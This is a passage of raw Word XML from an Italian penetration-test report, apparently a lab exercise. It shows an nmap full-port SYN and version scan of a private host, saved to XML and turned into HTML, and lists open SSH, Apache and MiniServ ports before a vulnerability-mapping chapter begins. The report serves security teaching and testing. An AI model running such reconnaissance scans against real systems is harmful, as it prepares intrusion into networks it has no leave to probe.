F6ta2cbkRZm&#10;mwC6Trt87Gs/ATrYdA394xJfhFM+WR2fwOlvAAAA//8DAFBLAwQUAAYACAAAACEArJDJSd0AAAAJ&#10;AQAADwAAAGRycy9kb3ducmV2LnhtbEyPwW7CMBBE75X6D9ZW4gZOjIQgjYOqSpV6AIkCH2DiJYka&#10;ryPbQPh7llN7290Zzb4p16PrxRVD7DxpyGcZCKTa244aDcfD13QJIiZD1vSeUMMdI6yr15fSFNbf&#10;6Aev+9QIDqFYGA1tSkMhZaxbdCbO/IDE2tkHZxKvoZE2mBuHu16qLFtIZzriD60Z8LPF+nd/cRrc&#10;pl6F9N3Mj7v58r7pDkme3Vbrydv48Q4i4Zj+zPDEZ3SomOnkL2Sj6DVMFRv5vFI8PPWFykGcNKg8&#10;VyCrUv5vUD0AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaDOJL+AAAA4QEAABMAAAAAAAAAAAAAAAAA&#10;AAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYACAAAACEAOP0h/9YAAACUAQAACwAAAAAA&#10;AAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYACAAAACEAckjH0XUCAABKBQAADgAAAAAA&#10;AAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAUAAYACAAAACEArJDJSd0AAAAJAQAADwAA&#10;AAAAAAAAAAAAAADPBAAAZHJzL2Rvd25yZXYueG1sUEsFBgAAAAAEAAQA8wAAANkFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3737B466" w14:textId="77777777" w:rsidR="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E21">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251674624" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2A997FBE" wp14:editId="6A4F1D44">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-1160</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>728736</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1007110" cy="120682"/>
                <wp:effectExtent l="0" t="0" r="21590" b="12700"/>
                <wp:wrapNone/>
                <wp:docPr id="715354707" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1007110" cy="120682"/>
                        </a:xfrm>
                        <a:prstGeom prst="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5B2D1251" w14:textId="77777777" w:rsidR="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E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97FBE" id="_x0000_s1033" style="position:absolute;left:0;text-align:left;margin-left:-.1pt;margin-top:57.4pt;width:79.3pt;height:9.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h3QdgIAAEoFAAAOAAAAZHJzL2Uyb0RvYy54bWysVN1v0zAQf0fif7D8zpJUYxvV0qlsKkKa&#10;tokN7dl17DbC8Zmz26T89ZydNC2jT4iX5L5+932+vukaw7YKfQ225MVZzpmyEqrarkr+/WXx4Yoz&#10;H4SthAGrSr5Tnt/M3r+7bt1UTWANplLIyIn109aVfB2Cm2aZl2vVCH8GTllSasBGBGJxlVUoWvLe&#10;mGyS5xdZC1g5BKm8J+ldr+Sz5F9rJcOj1l4FZkpOuYX0xfRdxm82uxbTFQq3ruWQhviHLBpRWwo6&#10;uroTQbAN1n+5amqJ4EGHMwlNBlrXUqUaqJoif1PN81o4lWqh5ng3tsn/P7fyYfvsnpDa0Do/9UTG&#10;KjqNTfxTfqxLzdqNzVJdYJKERZ5fFgX1VJKumOQXV5PYzeyAdujDFwUNi0TJkYaReiS29z70pnuT&#10;GMzCojYmDcTYKPBg6irKEoOr5a1BthVxkvnnfJGGR+GOzIiL0OxQS6LCzqjow9hvSrO6ouwnKZO0&#10;Zmp0K6RUNlwMZSTrCNOUwggsTgFNKAbQYBthKq3fCMxPAf+MOCJSVLBhBDe1BTzloPoxRu7t99X3&#10;NcfyQ7fsqOiSX8Yco2QJ1e4JGUJ/Dt7JRU0juhc+PAmk/aep0k2HR/poA23JYaA4WwP+OiWP9rSW&#10;pOWspXsquf+5Eag4M18tLeyn4vw8HmBizj9eTojBY83yWGM3zS3QoAt6PZxMZLQPZk9qhOaVTn8e&#10;o5JKWEmxSy4D7pnb0N85PR5SzefJjI7OiXBvn52MzmOf4wq+dK8C3bCngTb8Afa3J6Zv1rW3jUgL&#10;800AXaddPvR1mAAdbLqG4XGJL8Ixn6wOT+DsNwAAAP//AwBQSwMEFAAGAAgAAAAhALbYgozdAAAA&#10;CQEAAA8AAABkcnMvZG93bnJldi54bWxMj81uwjAQhO+VeAdrkXoDB0KrNI2DEFKlHqjE3wOYeEmi&#10;xuvINhDevsup3HZ3RrPfFMvBduKKPrSOFMymCQikypmWagXHw9ckAxGiJqM7R6jgjgGW5eil0Llx&#10;N9rhdR9rwSEUcq2gibHPpQxVg1aHqeuRWDs7b3Xk1dfSeH3jcNvJeZK8S6tb4g+N7nHdYPW7v1gF&#10;dlN9+Phdp8dtmt037SHKs/1R6nU8rD5BRBzivxke+IwOJTOd3IVMEJ2CyZyNfJ4tuMFDf8sWIE48&#10;pGkGsizkc4PyDwAA//8DAFBLAQItABQABgAIAAAAIQC2gziS/gAAAOEBAAATAAAAAAAAAAAAAAAA&#10;AAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgAAAAhADj9If/WAAAAlAEAAAsAAAAA&#10;AAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAGAAgAAAAhAOyKHdB2AgAASgUAAA4AAAAA&#10;AAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAGAAgAAAAhALbYgozdAAAACQEAAA8A&#10;AAAAAAAAAAAAAAAA0AQAAGRycy9kb3ducmV2LnhtbFBLBQYAAAAABAAEAPMAAADaBQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="5B2D1251" w14:textId="77777777" w:rsidR="00DD2E21" w:rsidRDefault="00DD2E21" w:rsidP="00DD2E21">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00626463" w:rsidRPr="00626463">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="52A3EE1A" wp14:editId="45FD4F9C">
            <wp:extent cx="5274310" cy="3380105"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="3335184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18482" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3380105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00DF5ECF" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura 5: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DF5ECF" w:rsidRPr="00DF5ECF">
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DF5ECF" w:rsidRPr="00DF5ECF">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Target e Port Scanning</w:t>
      </w:r>
      <w:r w:rsidR="00DF5ECF">
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DF5ECF" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DF5ECF" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DF5ECF">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> da </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DF5ECF">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>termiinale</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="35D60256" w14:textId="21E3FCF3" w:rsidR="00844D78" w:rsidRPr="00844D78" w:rsidRDefault="00844D78" w:rsidP="00844D78">
      <w:pPr>
        <w:pStyle w:val="Titolo2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DEAC67C" w14:textId="77777777" w:rsidR="00952F5F" w:rsidRDefault="00952F5F" w:rsidP="00DE20B5"/>
    <w:p w14:paraId="64A932C4" w14:textId="5416F63D" w:rsidR="00DE20B5" w:rsidRDefault="005D1AB9" w:rsidP="00DE20B5">
      <w:r>
        <w:t xml:space="preserve">Per </w:t>
      </w:r>
      <w:r w:rsidR="00416695">
        <w:t>esaminare</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> i risultati ottenuti dalla scansione effettuate da </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00416695">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">possiamo andare ad inserire i risultai ottenuti all’interno di un file </w:t>
      </w:r>
      <w:r w:rsidRPr="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.xml</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, tramite il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>sS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00110905">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> -T4 -A -p- 10.0.2.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>4 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>oX</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> outputScansione.xml</w:t>
      </w:r>
      <w:r w:rsidR="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="00DE20B5">
        <w:t>Il carattere -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DE20B5">
        <w:t>oX</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DE20B5">
        <w:t xml:space="preserve"> ci permette di salvare l’output della scansione in formato xml.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25ABE42A" w14:textId="022042A2" w:rsidR="00DE20B5" w:rsidRDefault="00416695" w:rsidP="00952F5F">
      <w:r>
        <w:t>Per facilitare la lettura del file</w:t>
      </w:r>
      <w:r w:rsidR="00DE20B5">
        <w:t xml:space="preserve"> andiamo a convertirlo in un file </w:t>
      </w:r>
      <w:r w:rsidR="00DE20B5" w:rsidRPr="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.html</w:t>
      </w:r>
      <w:r w:rsidR="00DE20B5">
        <w:t xml:space="preserve">. Quindi, eseguiamo il comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00DE20B5" w:rsidRPr="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>xsl</w:t>
      </w:r>
      <w:r w:rsidR="00CA3192">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="00DE20B5" w:rsidRPr="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>proc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DE20B5" w:rsidRPr="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00DE20B5" w:rsidRPr="00DE20B5">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>/ outputScansione.xml -o outputScansione.html</w:t>
      </w:r>
      <w:r w:rsidR="00952F5F">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00952F5F">
        <w:t xml:space="preserve">Si mostra la pagina html con le informazioni. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FC4C06" w14:textId="4853E388" w:rsidR="00952F5F" w:rsidRDefault="00952F5F" w:rsidP="00952F5F">
      <w:r>
        <w:t xml:space="preserve">Dove possiamo notare che le porte </w:t>
      </w:r>
      <w:r w:rsidR="00836453">
        <w:t>aperte sono:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784B247B" w14:textId="20F886B7" w:rsidR="00836453" w:rsidRDefault="00836453">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Porta 22, per il servizio </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> erogato dal produttore </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>OpenSSH</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e viene descritta anche la versione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FCBEC19" w14:textId="20DDF3ED" w:rsidR="00836453" w:rsidRDefault="00836453">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Porta 80, per il servizio http erogata da Apache </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>httpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e viene descritta anche la versione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4A386A" w14:textId="46B892CE" w:rsidR="00836453" w:rsidRDefault="00836453">
      <w:pPr>
        <w:pStyle w:val="Paragrafoelenco"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="11"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Porta 10000, per il servizio http erogata da </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Miniserv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e anche per lei viene descritta la versione.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF69093" w14:textId="44F9775F" w:rsidR="00836453" w:rsidRDefault="00836453" w:rsidP="00836453">
      <w:r>
        <w:t xml:space="preserve">Possiamo già notare che nella porta 80 </w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21">
        <w:t xml:space="preserve">ci viene citata una </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00DD2E21" w:rsidRPr="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>directory</w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21" w:rsidRPr="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> /</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00DD2E21" w:rsidRPr="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>ona</w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidR="00D76587">
        <w:t>con un</w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21">
        <w:t xml:space="preserve"> file </w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21" w:rsidRPr="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DD2E21">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>txt</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DD2E21">
        <w:t xml:space="preserve">, con ingresso vietato. Si nota che le stesse informazioni </w:t>
      </w:r>
      <w:r w:rsidR="00416695">
        <w:t>sono</w:t>
      </w:r>
      <w:r w:rsidR="00DD2E21">
        <w:t xml:space="preserve"> riportate nella Figura 5</w:t>
      </w:r>
      <w:r w:rsidR="007C1345">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AA83DDF" w14:textId="77777777" w:rsidR="007C1345" w:rsidRDefault="007C1345" w:rsidP="00836453"/>
    <w:p w14:paraId="699D9645" w14:textId="77777777" w:rsidR="007C1345" w:rsidRDefault="007C1345" w:rsidP="00836453"/>
    <w:p w14:paraId="089CE554" w14:textId="77777777" w:rsidR="007C1345" w:rsidRDefault="007C1345" w:rsidP="00836453"/>
    <w:p w14:paraId="14FDABE2" w14:textId="46CEDA63" w:rsidR="007C1345" w:rsidRDefault="007C1345" w:rsidP="00836453">
      <w:r w:rsidRPr="00952F5F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251672576" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="545C3FC8" wp14:editId="659274DB">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>-429260</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>320040</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6131560" cy="3316605"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:wrapSquare wrapText="bothSides"/>
            <wp:docPr id="887349458" name="Immagine 1"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9458" name="Immagine 1" descr="Immagine che contiene testo, schermata, linea, numero&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6131560" cy="3316605"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelV relativeFrom="margin">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="59CA2A08" w14:textId="3C22A426" w:rsidR="009B45EA" w:rsidRDefault="007C1345" w:rsidP="007C1345">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DF5ECF">
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DF5ECF">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> Target e Port Scanning</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> da </w:t>
      </w:r>
      <w:r w:rsidRPr="007C1345">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>outputScansione.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ECB2467" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="25ABF3AD" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="07782AC2" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="18839B78" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="11E43F5A" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="663B92FB" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="2CE957D0" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="702C506C" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="3F8D2B7A" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="44A5BA5D" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="75630C91" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="5E057C1A" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="53835199" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="007C7C2E"/>
    <w:p w14:paraId="3D2E86A5" w14:textId="706946BF" w:rsidR="009B45EA" w:rsidRPr="001D72C5" w:rsidRDefault="009B45EA" w:rsidP="009B45EA">
      <w:pPr>
        <w:pStyle w:val="Titolo1"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc139378617"/>
      <w:r w:rsidRPr="001D72C5">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001D72C5">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001D72C5">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mapping</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="5CE46395" w14:textId="77777777" w:rsidR="009B45EA" w:rsidRPr="001D72C5" w:rsidRDefault="009B45EA" w:rsidP="009B45EA"/>
    <w:p w14:paraId="1BFE4E04" w14:textId="336FFA87" w:rsidR="009B45EA" w:rsidRDefault="009B45EA" w:rsidP="009B45EA">
      <w:r w:rsidRPr="009B45EA">
        <w:t xml:space="preserve">Dopo aver individuato i servi che </w:t>
      </w:r>
      <w:r>
        <w:t>la macchina target eroga e le loro versioni, possiamo procede</w:t>
      </w:r>
      <w:r w:rsidR="00B01334">
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> con la fase successiva cioè </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vulnetability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Mapping</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o anche chiamata </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vunerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009B45EA">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
